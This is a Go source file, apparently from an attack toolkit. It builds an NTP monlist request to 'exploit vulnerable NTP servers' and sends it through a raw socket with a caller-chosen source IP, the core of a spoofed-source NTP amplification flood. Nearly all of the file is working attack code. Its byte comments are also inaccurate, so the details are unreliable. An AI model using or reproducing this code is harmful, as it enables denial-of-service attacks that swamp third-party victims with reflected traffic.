package core

import (
	"bytes"
	"encoding/binary"
	"net"
)

// BuildNTPMonlistRequest builds the NTP monlist request to exploit vulnerable NTP servers.
func BuildNTPMonlistRequest() ([]byte, error) {
	ntpRequest := make([]byte, 48)

	// Control Message, Mode 3 (Client) + Opcode 7 (MON_GETLIST_1)
	ntpRequest[0] = 0x17
	ntpRequest[1] = 0x02 // Sequence number
	ntpRequest[2] = 0x00 // Status
	ntpRequest[3] = 0x31 // Status (part 2)
	ntpRequest[4] = 0x00 // Association ID (most significant byte)
	ntpRequest[5] = 0x00 // Association ID (least significant byte)

	// Fill the rest of the request with zeros
	for i := 6; i < len(ntpRequest); i++ {
		ntpRequest[i] = 0x00
	}

	buf := new(bytes.Buffer)
	err := binary.Write(buf, binary.BigEndian, ntpRequest)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// SendNTPMonlist sends the NTP monlist request via UDP to the destination.
func SendNTPMonlist(rawSocket RawSocket, srcIp, dstIp net.IP, data []byte) error {
	return SendPacket(rawSocket, srcIp, dstIp, 17, data) // 17 is the protocol number for UDP
}
